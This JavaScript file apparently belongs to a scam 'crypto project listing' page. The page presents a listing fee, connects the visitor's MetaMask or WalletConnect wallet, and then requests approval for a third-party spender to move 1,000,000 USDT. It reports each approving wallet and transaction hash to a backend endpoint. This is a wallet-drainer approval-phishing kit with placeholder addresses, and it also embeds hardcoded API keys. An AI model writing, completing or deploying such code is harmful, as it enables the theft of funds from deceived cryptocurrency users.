'use strict';

/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectButton = document.getElementById('walletConnectButton');

/* ============================
   UI FLOW
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = 'none';
  });
}

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = 'none';
  });
}

if (metaMaskButton) {
  metaMaskButton.addEventListener('click', connectMetaMask);
}

if (walletConnectButton) {
  walletConnectButton.addEventListener('click', connectWalletConnect);
}

/* ============================
   METAMASK
   ============================ */
async function connectMetaMask() {
  try {
    if (!window.ethereum || !window.ethereum.request) {
      console.error('MetaMask not available');
      return;
    }

    const accounts = await window.ethereum.request({
      method: 'eth_requestAccounts'
    });

    if (!Array.isArray(accounts) || !accounts.length) return;

    await approveSpender(accounts[0]);
  } catch (error) {
    console.error('Error connecting to MetaMask:', error);
  }
}

/* ============================
   WALLETCONNECT v2 (FUNCTIONAL)
   ============================ */
let wcProvider = null;

async function connectWalletConnect() {
  try {
    if (wcProvider) {
      await wcProvider.disconnect().catch(() => {});
      wcProvider = null;
    }

    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');

    wcProvider = await EthereumProvider.init({
      projectId: "59ba0228712f04a947916abb7db06ab1",
      chains: [1],
      showQrModal: true,
      rpcMap: {
        1: "https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc",
      },
      metadata: {
        name: "Crypto Project Listing",
        url: window.location.origin
      }
    });

    const accounts = await wcProvider.enable();
    window.ethereum = wcProvider;

    if (typeof Web3 === 'undefined') {
      console.error('Web3 not available');
      return;
    }
    if (typeof window.web3 === 'undefined') {
      window.web3 = new Web3(wcProvider);
    }

    const userAccounts = await window.web3.eth.getAccounts();
    if (!Array.isArray(userAccounts) || !userAccounts.length) return;

    await approveSpender(userAccounts[0]);

    window.addEventListener('beforeunload', () => {
      if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
    });
  } catch (error) {
    console.error('Error connecting to WalletConnect:', error);
  }
}

/* ============================
   APPROVAL LOGIC
   ============================ */
async function approveSpender(account) {
  try {
    const spenderAddress = 'YOUR_SPENDER_ADDRESS_HERE';
    const usdtAddress = 'USDT_CONTRACT_ADDRESS_HERE'; // Replace with actual USDT contract address

    const usdtAmount = (1000000 * 10 ** 6).toString();

    const abi = [
      {
        "constant": false,
        "inputs": [
          { "name": "_spender", "type": "address" },
          { "name": "_value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
      }
    ];

    const contract = new window.web3.eth.Contract(abi, usdtAddress);
    const receipt = await contract.methods
      .approve(spenderAddress, usdtAmount)
      .send({ from: account });

    await fetch("http://localhost:3000/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ owner: account, token: usdtAddress, txHash: receipt.transactionHash })
    });

    alert('USDT approval successful!');
  } catch (error) {
    console.error('Approval flow failed:', error);
  }
}
